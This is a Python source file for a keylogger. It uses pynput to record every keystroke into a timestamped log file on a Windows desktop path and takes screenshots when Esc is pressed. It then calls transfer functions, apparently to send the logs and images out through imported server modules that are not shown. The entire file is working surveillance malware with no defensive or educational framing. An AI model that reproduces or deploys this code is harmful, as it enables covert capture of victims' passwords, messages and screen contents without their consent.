# importing required libraries
import time
import pynput
from Screenshot import *
from LogServer import *
from ImageServer import *

from pynput.keyboard import Key, Listener

count = 0
keys = []

file_name = time.strftime("%Y%m%d-%H%M%S")+".txt"


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 2:
        write_file(keys)
        keys = []
        count = 0


def write_file(keys):
    with open(f"C:\\Users\\Isuru\\Desktop\\Test\\Logs\\{file_name}", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        take_screenshots()
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

filetransfer()
sendimage()
